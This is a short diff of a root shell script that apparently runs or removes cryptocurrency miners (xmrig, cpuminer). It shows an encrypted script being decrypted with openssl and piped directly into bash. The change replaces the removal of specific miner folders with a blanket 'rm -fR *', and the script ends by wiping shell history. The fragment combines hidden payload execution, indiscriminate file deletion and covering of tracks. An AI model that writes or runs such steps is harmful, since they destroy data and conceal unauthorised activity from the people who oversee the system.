@@ -52,7 +52,5 @@ chmod +x /root/kill_miner.sh
 sleep 3
 openssl enc -d -aes-256-cbc -pbkdf2 -in /root/danielluis1922.sh -k $password | bash
 rm -fv *
-rm -fR /root/cpuminer-opt-linux/
-rm -fR /root/cpuminer-opt-aurum-prerelease/
-rm -fR xmrig-6.21.0/
+rm -fR *
 history -c && history -w
